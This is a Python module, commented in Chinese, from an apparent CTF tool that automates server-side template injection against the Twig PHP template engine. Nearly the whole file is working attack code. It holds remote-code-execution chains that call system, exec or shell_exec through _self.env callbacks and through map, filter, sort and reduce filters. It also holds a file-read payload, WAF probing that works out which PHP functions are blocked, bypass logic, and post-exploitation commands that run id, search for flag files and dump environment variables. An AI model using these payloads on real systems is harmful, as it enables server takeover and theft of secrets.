"""
CTF 解题工具 — Twig 引擎模块
用途: 面向 CTF 竞赛的 Twig (PHP/Symfony) SSTI 自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

特点:
  - Twig 1.x/2.x: _self.env 回调注册法
  - Twig 3.x: map/filter/sort/reduce 回调法（天然绕过函数名过滤）
  - WAF 探测: PHP 函数名过滤 + Twig 特有语法过滤
"""

from .base import BaseEngine
from .utils import is_waf_blocked


# Twig 绕过策略
BYPASS_STRATEGIES = [
    {
        'name': '无过滤（原始链）',
        'filters': set(),
        'rce': '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("CMD")}}',
        'file_read': "{{'FILEPATH'|file_excerpt(0, 1000)}}",
    },
    {
        'name': '过滤 exec/system 关键字 (map/filter 回调)',
        'filters': {'keyword'},
        'rce': 'twig_callback_bypass',  # 特殊标记
        'file_read': None,
    },
    {
        'name': '过滤 _self 关键字 (map 回调法)',
        'filters': {'_self'},
        'rce': '{{["CMD"]|map("system")|join(",")}}',
        'file_read': None,
    },
]


class TwigEngine(BaseEngine):
    """Twig (PHP/Symfony) SSTI 引擎"""

    name = 'twig'
    template_tags = ('{{', '}}', '{%', '%}')
    error_keywords = [
        'Fatal error', 'Parse error', 'Uncaught Exception',
        'Twig_Error_Syntax', 'Twig\\Error\\SyntaxError',
        'Internal Server Error', 'ArgumentCountError',
    ]

    detect_payloads = [
        {'payload': '{{7*7}}', 'expected': '49', 'engines': ['twig']},
        {'payload': "{{7*'7'}}", 'expected': '49', 'engines': ['twig']},
    ]

    fingerprints = [
        {"payload": "{{7*'7'}}", "expected": "49", "desc": "Twig 数学运算（非字符串重复）"},
        {"payload": "{{_self.env.display(\"{{7*7}}\")}}", "expected": "49", "desc": "Twig _self 对象"},
    ]

    rce_chains = [
        # Twig 1.x/2.x 经典回调注册法
        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("CMD")}}',
        '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("CMD")}}',
        # Twig 3.x 回调法
        "{{['CMD']|filter('system')}}",
        "{{['CMD']|map('shell_exec')}}",
        "{{['CMD',0]|sort('system')}}",
        "{{[0,0]|reduce('system','CMD')}}",
    ]

    file_read_chains = [
        "{{'FILEPATH'|file_excerpt(0, 1000)}}",
    ]

    bypass_strategies = BYPASS_STRATEGIES

    # PHP 函数名变体（绕过函数名过滤）
    PHP_RCE_FUNCTIONS = ['system', 'exec', 'passthru', 'shell_exec', 'popen']
    PHP_FILE_FUNCTIONS = ['file_get_contents', 'readfile', 'fread', 'file']

    def probe_waf(self, toolkit):
        """Twig WAF 探测"""
        filters = set()
        filtered_keywords = set()

        # 字符级探测
        t = toolkit.send_and_clean('{{7*7}}')
        if '49' not in t:
            return filters, filtered_keywords

        t = toolkit.send_and_clean('{{7 * 7}}')
        if '49' not in t:
            filters.add('space')

        # 关键字探测: PHP 函数名
        for func in self.PHP_RCE_FUNCTIONS:
            payload = f'{{{{_self.env.registerUndefinedFilterCallback("{func}")}}}}'
            t = toolkit.send_and_clean(payload)
            if is_waf_blocked(t):
                filtered_keywords.add(func)

        # _self 关键字
        t = toolkit.send_and_clean('{{_self}}')
        if is_waf_blocked(t):
            filtered_keywords.add('_self')

        if filtered_keywords:
            filters.add('keyword')

        self.waf_filters = filters
        self.filtered_keywords = filtered_keywords
        return filters, filtered_keywords

    def build_rce_payload(self, cmd, toolkit=None):
        """Twig RCE payload 构造 — 支持函数名变体绕过"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None

        if strategy and strategy['rce'] == 'twig_callback_bypass':
            # 逐个尝试未过滤的 PHP 函数
            for func in self.PHP_RCE_FUNCTIONS:
                if func in self.filtered_keywords:
                    continue
                # 尝试 map 回调法
                payload = f'{{{{["{cmd}"]|map("{func}")|join(",")}}}}'
                return payload, None
            # 尝试 filter 回调法
            for func in self.PHP_RCE_FUNCTIONS:
                if func in self.filtered_keywords:
                    continue
                payload = f'{{{{["{cmd}"]|filter("{func}")|join(",")}}}}'
                return payload, None
            # 尝试 sort 回调法
            for func in self.PHP_RCE_FUNCTIONS:
                if func in self.filtered_keywords:
                    continue
                payload = f'{{{{["{cmd}",0]|sort("{func}")|join(",")}}}}'
                return payload, None
            return None, None

        if strategy and isinstance(strategy['rce'], str) and 'CMD' in strategy['rce']:
            return strategy['rce'].replace('CMD', cmd), None

        # 默认: 逐个尝试静态链
        for chain in self.rce_chains:
            return chain.replace('CMD', cmd), None
        return None, None

    def build_file_payload(self, filepath, toolkit=None):
        """Twig 文件读取 payload"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None
        if strategy and strategy.get('file_read') and 'FILEPATH' in str(strategy['file_read']):
            return strategy['file_read'].replace('FILEPATH', filepath), None

        # 尝试 PHP 文件函数变体
        for func in self.PHP_FILE_FUNCTIONS:
            if func in self.filtered_keywords:
                continue
            return f'{{{{{func}("FILEPATH")}}}}'.replace('FILEPATH', filepath), None

        for chain in self.file_read_chains:
            return chain.replace('FILEPATH', filepath), None
        return None, None

    def is_rce_output(self, text, cmd, toolkit=None):
        if not text or len(text) < 2:
            return False
        if is_waf_blocked(text):
            return False
        if '{{' in text or '{%' in text:
            return False
        for kw in self.error_keywords:
            if kw in text:
                return False
        if cmd == 'id':
            return 'uid=' in text or 'gid=' in text
        return len(text) > 0

    def info_gathering(self, toolkit):
        """Twig 信息收集"""
        print("\n" + "=" * 60)
        print("[*] 信息收集 (Twig)")
        print("=" * 60)

        # Twig 版本
        text = toolkit.send_and_clean('{{constant("Twig\\\\Environment::VERSION")}}')
        if text and not is_waf_blocked(text):
            print(f"  Twig 版本: {text}")

        # PHP 信息
        text = toolkit.send_and_clean('{{"phpinfo"|filter("system")}}')
        if text and not is_waf_blocked(text) and '{{' not in text:
            print(f"  PHP 信息 (前300字符): {text[:300]}")

        # 通过 RCE 收集
        if toolkit.working_chain:
            print("\n  [1] 系统信息 (通过 RCE):")
            output = toolkit.exec_cmd('id')
            if output:
                print(f"      {output[:300]}")

            print("\n  [2] 寻找 flag 文件:")
            output = toolkit.exec_cmd('find / -name "flag*" -type f 2>/dev/null | head -20')
            if output:
                print(f"      {output[:500]}")
            output = toolkit.exec_cmd('cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null')
            if output:
                print(f"      [+] flag: {output}")

            print("\n  [3] 环境变量:")
            output = toolkit.exec_cmd('env')
            if output:
                print(f"      {output[:500]}")
